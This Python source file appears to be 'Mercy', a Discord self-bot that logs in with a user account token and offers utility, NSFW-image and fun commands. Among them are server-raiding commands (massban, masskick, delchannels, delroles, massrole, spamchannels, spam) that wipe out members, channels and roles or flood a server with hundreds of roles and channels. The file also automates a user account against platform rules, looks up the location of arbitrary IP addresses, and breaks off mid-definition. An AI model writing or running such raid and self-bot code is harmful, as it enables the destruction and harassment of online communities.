#UTF-8
version = "++"


import discord, json, sys, subprocess, time, os, colorama, base64, codecs, datetime, io, random, numpy, smtplib, time, datetime, time
import string, ctypes, urllib.parse, urllib.request, re, webbrowser, aiohttp, asyncio, functools, logging, requests, datetime

from discord.embeds import Embed
from time import sleep
from colorama import Fore, Back, Style
from discord.ext import commands
from discord.ext import tasks
from bs4 import BeautifulSoup as bs4
from itertools import cycle
from sys import platform
from time import strftime, time, gmtime
from os import mkdir, path, system, name
from random import choice
from threading import Thread, Lock
colorama.init()

with open('Config/config.json') as f:
    config = json.load(f)

token = config.get('token')
prefix = config.get("prefix")
notify = config.get('notify')
stream_url = config.get('stream_url')
titlee = config.get('title')
foto = config.get("thumbnail")
colour = int(config.get('embedcolor'), 16)
foother2 = f"Mercy{version}"
key = config.get('license')
userlogin = config.get("username")
one = config.get("status_one")
two = config.get("status_two")
three = config.get("status_three")
delete = config.get("deletetimer")
stream_image = config.get("stream_embed_image")
titlecustom = config.get("title_menu")
nitro_sniper = config.get('nitro_sniper')

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]


m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

Mercy = discord.Client()
Mercy = commands.Bot(description='i dont know', command_prefix=prefix, self_bot=True)
Mercy.remove_command("help")

start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()
asciicolor2 = f"{Fore.LIGHTBLACK_EX}", f"{Fore.RED}", f"{Fore.BLUE}", f"{Fore.LIGHTBLUE_EX}", f"{Fore.LIGHTCYAN_EX}", f"{Fore.LIGHTGREEN_EX}", f"{Fore.LIGHTRED_EX}", f"{Fore.LIGHTMAGENTA_EX}", f"{Fore.LIGHTYELLOW_EX}", f"{Fore.MAGENTA}"
asciicolor = random.choice(asciicolor2)

randomcomets2 = [
    "Mercy Is Back",
    "1337",
    "Sell minecraft no premium",
    "I Need Robux",
    "14.0???",
    "New Commands",
    "UwU",
    "UTF-8",
    "Mercy++ is new"
]
randomcoments = random.choice(randomcomets2)

def startprint():
    cmd = "mode 120,28"
    os.system(cmd)
    ctypes.windll.kernel32.SetConsoleTitleW(f"Mercy{version} | Logged in as {Mercy.user.name}#{Mercy.user.discriminator} ~~ {titlecustom}")
    print(f'''{Fore.RESET}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

\t\t\t              {Fore.WHITE}███{asciicolor}╗{Fore.WHITE}   ███{asciicolor}╗{Fore.WHITE}███████{asciicolor}╗{Fore.WHITE}██████{asciicolor}╗  {Fore.WHITE}██████{asciicolor}╗{Fore.WHITE}██{asciicolor}╗   {Fore.WHITE}██{asciicolor}╗
\t\t\t              {Fore.WHITE}████{asciicolor}╗{Fore.WHITE} ████{asciicolor}║{Fore.WHITE}██{asciicolor}╔════╝{Fore.WHITE}██{asciicolor}╔══{Fore.WHITE}██{asciicolor}╗{Fore.WHITE}██{asciicolor}╔════╝╚{Fore.WHITE}██{asciicolor}╗ {Fore.WHITE}██{asciicolor}╔╝
\t\t\t              {Fore.WHITE}██{asciicolor}╔{Fore.WHITE}████{asciicolor}╔{Fore.WHITE}██{asciicolor}║{Fore.WHITE}█████{asciicolor}╗{Fore.WHITE}  ██████{asciicolor}╔╝{Fore.WHITE}██{asciicolor}║      ╚{Fore.WHITE}████{asciicolor}╔╝ 
\t\t\t              {Fore.WHITE}██{asciicolor}║╚{Fore.WHITE}██{asciicolor}╔╝{Fore.WHITE}██{asciicolor}║{Fore.WHITE}██{asciicolor}╔══╝  {Fore.WHITE}██{asciicolor}╔══{Fore.WHITE}██{asciicolor}╗{Fore.WHITE}██{asciicolor}║       {asciicolor}╚{Fore.WHITE}██{asciicolor}╔╝  
\t\t\t              {Fore.WHITE}██{asciicolor}║ ╚═╝{Fore.WHITE} ██{asciicolor}║{Fore.WHITE}███████{asciicolor}╗{Fore.WHITE}██{asciicolor}║ {Fore.WHITE} ██{asciicolor}║╚{Fore.WHITE}██████{asciicolor}╗   {Fore.WHITE}██{asciicolor}║   
\t\t\t              {asciicolor}╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   

\t\t\t              {Fore.WHITE}[{asciicolor}+{Fore.WHITE}] Logged in as >> {Mercy.user.name}#{Mercy.user.discriminator} 
\t\t\t              {Fore.WHITE}[{asciicolor}+{Fore.WHITE}] Prefix is >> {Mercy.command_prefix}

{Fore.RESET}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――{Fore.RESET}''' + Fore.RESET)

def load():
    ctypes.windll.kernel32.SetConsoleTitleW(f"Mercy{version} | Logged in as {Mercy.user.name}#{Mercy.user.discriminator} ~~ {titlecustom}")
    print(f'''――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

\t\t\t              {Fore.WHITE}███{asciicolor}╗{Fore.WHITE}   ███{asciicolor}╗{Fore.WHITE}███████{asciicolor}╗{Fore.WHITE}██████{asciicolor}╗  {Fore.WHITE}██████{asciicolor}╗{Fore.WHITE}██{asciicolor}╗   {Fore.WHITE}██{asciicolor}╗
\t\t\t              {Fore.WHITE}████{asciicolor}╗{Fore.WHITE} ████{asciicolor}║{Fore.WHITE}██{asciicolor}╔════╝{Fore.WHITE}██{asciicolor}╔══{Fore.WHITE}██{asciicolor}╗{Fore.WHITE}██{asciicolor}╔════╝╚{Fore.WHITE}██{asciicolor}╗ {Fore.WHITE}██{asciicolor}╔╝
\t\t\t              {Fore.WHITE}██{asciicolor}╔{Fore.WHITE}████{asciicolor}╔{Fore.WHITE}██{asciicolor}║{Fore.WHITE}█████{asciicolor}╗{Fore.WHITE}  ██████{asciicolor}╔╝{Fore.WHITE}██{asciicolor}║      ╚{Fore.WHITE}████{asciicolor}╔╝ 
\t\t\t              {Fore.WHITE}██{asciicolor}║╚{Fore.WHITE}██{asciicolor}╔╝{Fore.WHITE}██{asciicolor}║{Fore.WHITE}██{asciicolor}╔══╝  {Fore.WHITE}██{asciicolor}╔══{Fore.WHITE}██{asciicolor}╗{Fore.WHITE}██{asciicolor}║       {asciicolor}╚{Fore.WHITE}██{asciicolor}╔╝  
\t\t\t              {Fore.WHITE}██{asciicolor}║ ╚═╝{Fore.WHITE} ██{asciicolor}║{Fore.WHITE}███████{asciicolor}╗{Fore.WHITE}██{asciicolor}║ {Fore.WHITE} ██{asciicolor}║╚{Fore.WHITE}██████{asciicolor}╗   {Fore.WHITE}██{asciicolor}║   
\t\t\t              {asciicolor}╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   

\t\t\t              {Fore.WHITE}[{asciicolor}+{Fore.WHITE}] Logged in as >> {Mercy.user.name}#{Mercy.user.discriminator} 
\t\t\t              {Fore.WHITE}[{asciicolor}+{Fore.WHITE}] Prefix is >> {Mercy.command_prefix}

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――{Fore.RESET}''' + Fore.RESET)

def Clear():
    os.system('cls')
Clear()

def Init():
    token = config.get('token')
    try:
        Mercy.run(token, bot=False, reconnect=True)
        os.system(f'title Mercy {version}')
    except discord.errors.LoginFailure:
        print(f"[{Back.RED}{asciicolor}CRITICAL ERROR{Back.RESET}{asciicolor}]{asciicolor} Improper token has been passed" + Fore.RESET)
        os.system('pause >NUL')


@Mercy.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        embed = discord.Embed(title=f"{titlee} | ERROR", color = colour, description=f"[**ERROR**]: You\'re missing permission to execute this command")
        embed.set_footer(text=(foother2))
        embed.set_thumbnail(url=(foto))
        await ctx.send(embed=embed, delete_after=3)
    elif isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(title=f"{titlee} | ERROR", color = colour, description=f"[**ERROR**]: Missing arguments: {error}")
        embed.set_footer(text=(foother2))
        embed.set_thumbnail(url=(foto))
        await ctx.send(embed=embed, delete_after=3)
    elif isinstance(error, numpy.AxisError):
        embed = discord.Embed(title=f"{titlee} | ERROR", color = colour, description=f"[**ERROR**]: Invalid Image.")
        embed.set_footer(text=(foother2))
        embed.set_thumbnail(url=(foto))
        await ctx.send(embed=embed, delete_after=3)
    elif isinstance(error, discord.errors.Forbidden):
        embed = discord.Embed(title=f"{titlee} | ERROR", color = colour, description=f"[**ERROR**]: 404 Forbidden Access: {error}")
        embed.set_footer(text=(foother2))
        embed.set_thumbnail(url=(foto))
        await ctx.send(embed=embed, delete_after=3)
    elif "Cannot send an empty message" in error_str:
        embed = discord.Embed(title=f"{titlee} | ERROR", color = colour, description=f"[**ERROR**]: Message contents cannot be null")
        embed.set_footer(text=(foother2))
        embed.set_thumbnail(url=(foto))
        await ctx.send(embed=embed, delete_after=3)
    else:
        embed = discord.Embed(title=f"{titlee} | ERROR", color = colour, description=f"[**ERROR**]: {error_str}")
        embed.set_footer(text=(foother2))
        embed.set_thumbnail(url=(foto))
        await ctx.send(embed=embed, delete_after=3)

@Mercy.event
async def on_message_edit(before, after):
    await Mercy.process_commands(after)

@Mercy.event
async def on_connect():
    Clear()
    startprint()

@Mercy.command()
async def time(ctx):
    await ctx.message.delete()
    now = datetime.datetime.utcnow()
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = '''**{h}** hours 
        **{m}** minutes
        **{s}** seconds'''
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    em = discord.Embed(title=f"{titlee}", color=colour , description=f"\n\nSelfbot usage time\n {uptime_stamp}")
    em.set_footer(text=(foother2))
    em.set_thumbnail(url="https://m.gifanimados.com/Gifs-Tecnologia/Animaciones-Relojes/Relojes-Despertadores/Reloj-Despertador-89509.gif")
    await ctx.send(embed=em)

@Mercy.command(aliases=["serverinformation","infoserver"])
async def serverinfo(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}serverinfo")
    await ctx.message.delete()

    embed=discord.Embed(title=f"{titlee} - Gathering info on {ctx.guild.name}", color=colour)
    embed.set_thumbnail(url=f"{foto}")
    embed.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    message = await ctx.send(embed=embed)
    await asyncio.sleep(1)
    try:
        boostlevel = ctx.guild.premium_tier
    except:
        boostlevel = "Error"
    try:
        boostcount = ctx.guild.premium_subscription_count
    except:
        boostcount = "Error"
    try:
        roles = len(ctx.guild.roles)
    except:
        roles = "Error"
    try:
        cate = len(ctx.guild.categories)
    except:
        cate = "Error"
    try:
        chanel = len(ctx.guild.channels)
    except:
        chanel = "Error"
    try:
        textchans = len(ctx.guild.text_channels)
    except:
        textchans = "Error"
    try:
        vcchans = len(ctx.guild.voice_channels)
    except:
        vcchans = "Error"
    try:
        users = ctx.guild.member_count
    except:
        users = "Error"
    try:
        onlineusers = sum(member.status==discord.Status.online and not member.bot for member in ctx.guild.members)
    except:
        onlineusers = "Error"
    try:
        offlineusers = sum(member.status==discord.Status.offline and not member.bot for member in ctx.guild.members)
    except:
        offlineusers = "Error"
    try:
        humans = sum(not member.bot for member in ctx.guild.members)
    except:
        humans = "Error"
    try:
    
        bots = sum(member.bot for member in ctx.guild.members)
    except:
        bots = "Error"
    
    info = f"""
`Boost Count` **{boostcount}**
`Server Boost Level` **{boostlevel}**
`Role Count` **{roles}**
`Category Count` **{cate}**
`Total Channel Count` **{chanel}**
`Text Channel Count` **{textchans}**
`Voice Channel Count` **{vcchans}**
`Total Member Count` **{users}**


"""

    embed=discord.Embed(title=f"{titlee} | Server :  {ctx.guild.name}", description=info, color = colour)
    embed.set_thumbnail(url=f"{foto}")
    embed.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await message.edit(embed=embed, delete_after=15)

@Mercy.command(aliases=['bitcoin'])
async def btc(ctx):
    print(f"[{asciicolor}+{Fore.RESET}] {Mercy.command_prefix}btc")
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2015/12/08/12/12/bitcoin-2250715_1560_720.png')
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

## Status

@Mercy.command(aliases=['twitch'",twitchstream","streaming"])
async def stream(ctx, *, message):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}stream {message}")
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    await Mercy.change_presence(activity=stream)
    em = discord.Embed(title=f"{titlee}",description=f"Your status is **{message}**\n\nStreaming status.", color=colour)
    em.set_thumbnail(url=f"{foto}")
    em.set_image(url=(stream_image))
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command(alises=["game"])
async def playing(ctx, *, message):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}playing {message}")
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Mercy.change_presence(activity=game)

@Mercy.command(aliases=["watch"])
async def watching(ctx, *, message):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}watching {message}")
    await ctx.message.delete()
    await Mercy.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))

@Mercy.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}stopactivity")
    await ctx.message.delete()
    await Mercy.change_presence(activity=None, status=discord.Status.dnd)

@tasks.loop(seconds=3)
async def btc_status():
    r = requests.get('https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
    value = r['bpi']['USD']['rate']
    await asyncio.sleep(3)
    btc_stream = discord.Streaming(
        name="BTC price: "+value+"$USD", 
        url=stream_url, 
    )
    await Mercy.change_presence(activity=btc_stream)

@Mercy.command()
async def custom(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}custom")
    await ctx.message.delete()
    customstatus.start()

@tasks.loop(seconds=1)
async def customstatus():
    await Mercy.change_presence(activity=discord.Game(name=one))
    await asyncio.sleep(1)
    await Mercy.change_presence(activity=discord.Game(name=two))
    await asyncio.sleep(1)
    await Mercy.change_presence(activity=discord.Game(name=three))
    await asyncio.sleep(1)
    

@Mercy.command(aliases=['btc-stream', 'streambtc', 'stream-btc', 'btcstatus'])
async def btcstream(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}btcstream")
    await ctx.message.delete()   
    btc_status.start()

## NSFW

@Mercy.command()
async def boobs(ctx):
    ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}boobs")
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed(color = (colour))
    em.set_image(url=res['url'])
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def tits(ctx):
    ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}tits")
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed(color = (colour))
    em.set_image(url=res['url'])
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    em.set_author(name="Mercy", url="https://i.imgur.com/15WqSm2R.png", icon_url="https://i.imgur.com/15WqSm2R.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def blowjob(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}blowjob")
    ctx.message.delete(color = (colour))
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed(color = (colour))
    em.set_image(url=res['url'])
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def lesbian(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}lesbian")
    ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed(color = (colour))
    em.set_image(url=res['url'])
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def cumslut(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}cumslut")
    ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    em = discord.Embed(color = (colour))
    em.set_image(url=res['url'])
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def pussy(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}pussy")
    ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    em = discord.Embed(color = (colour))
    em.set_image(url=res['url'])
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def anal(ctx): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}anal")
    ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    em = discord.Embed(color = (colour))   
    em.set_image(url=res['url'])
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15) 

## Misc Commands

@Mercy.command()
async def kiss(ctx, user: discord.User):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}kiss {user}")
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    em = discord.Embed(description=ctx.author.mention + f" **has given a kiss to** " + user.mention, color = (colour))
    em.set_image(url=res['url'])
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def slap(ctx, user: discord.User):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}slap {user}")
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    em = discord.Embed(description=ctx.author.mention + f" **slepped** " + user.mention, color = (colour))
    em.set_image(url=res['url'])
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def hug(ctx, user: discord.User):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}hug {user}")
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    em = discord.Embed(description=ctx.author.mention + f" **gave a hug to** " + user.mention, color = (colour))
    em.set_image(url=res['url'])
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def pat(ctx, user: discord.User):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}pat {user}")
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    em = discord.Embed(description=ctx.author.mention + f" **stroked** " + user.mention, color = (colour))
    em.set_image(url=res['url'])
    await ctx.send(embed=em, delete_after=15)

## Others commands

@Mercy.command()
async def ascii(ctx, *, text):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}ascii {text}")
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")


@Mercy.command()
async def logout(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}logout")
    await ctx.message.delete()
    notification = Notify()
    notification.title = "Mercy :("
    notification.message = "Good bye!\nHave a good day or night."
    notification.icon = "Images/Icon.png"
    notification.audio = "Sound/Logout.wav"

    notification.send()
    await Mercy.logout()

@Mercy.command()
async def spam(ctx, amount: int, *, message):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}spam {amount} {message}")
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@Mercy.command()
async def massban(ctx): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}massban")
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@Mercy.command()
async def masskick(ctx): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}masskick")
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    

@Mercy.command()
async def massrole(ctx): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}massrole")
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=("Mercy"), color=(colour))
        except:
            return    

@Mercy.command()
async def delchannels(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}delchannels")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@Mercy.command() 
async def delroles(ctx): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}delroles")
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass


@Mercy.command()
async def massunban(ctx): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}massunban")
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass


@Mercy.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}copy {ctx.guild.name}")
    await ctx.message.delete()
    msg = em = discord.Embed(title=f"{titlee}",description = f"Cloning server...\n\nServer : {ctx.guild.name}\nCloning server by : {ctx.author.mention}", color = (colour))
    em.set_thumbnail(url=f"{foto}")
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=5)
    await Mercy.create_guild(f'Mercy-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Mercy.guilds:
        if f'Mercy-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass
    msg = em = discord.Embed(title=f"{titlee}",description = f"Successfully cloned server.", color = (colour))
    em.set_thumbnail(url=f"{foto}")
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}geoip {ipaddr}")
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed(color = (colour))
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
            em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    return await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def purge(ctx, amount : int):
    await ctx.channel.purge(limit=amount)
    embed = discord.Embed(description=f"**BOOM!** \n{amount} deleted messages on this channel.\n\nMessages deleted by {ctx.author.mention}\ndeleted messages : {amount}", color=(colour))
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def dog(ctx): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}dog")
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed(title="Random dog image", color = (colour))
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em, delete_after=15)
    except:
        await ctx.send(str(r['message']))    

@Mercy.command()
async def fox(ctx): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}fox")
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title="Random fox image", color = (colour))
    em.set_image(url=r["image"])
    try:
        await ctx.send(embed=em, delete_after=15)
    except:
        await ctx.send(r['image'])

@Mercy.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.User = None): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}dick")
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", color = (colour))
    await ctx.send(embed=em, delete_after=15)

@Mercy.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}cls")
    await ctx.message.delete()
    Clear()
    startprint()

@Mercy.command(aliases=['slots', 'bet'])
async def slot(ctx): # b'\xfc'
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}slot")
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won!"}, color = (colour)))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won!"}, color = (colour)))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}, color = (colour)))

@Mercy.command()
async def stopafk(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}stopafk")
    await ctx.message.delete()
    await Mercy.change_presence(activity=None, status=discord.Status.dnd)
    print(f"{Fore.MAGENTA}[{asciicolor}+{Fore.MAGENTA}]{asciicolor} AFK MODE : {asciicolor}OFF")

@Mercy.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannels(ctx, *, message):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}spamchannels {message}")
    await ctx.message.delete()
    for _i in range(450):
        try:
            await ctx.guild.create_voice_channel(name=message)
        except:
            return

@Mercy.command()
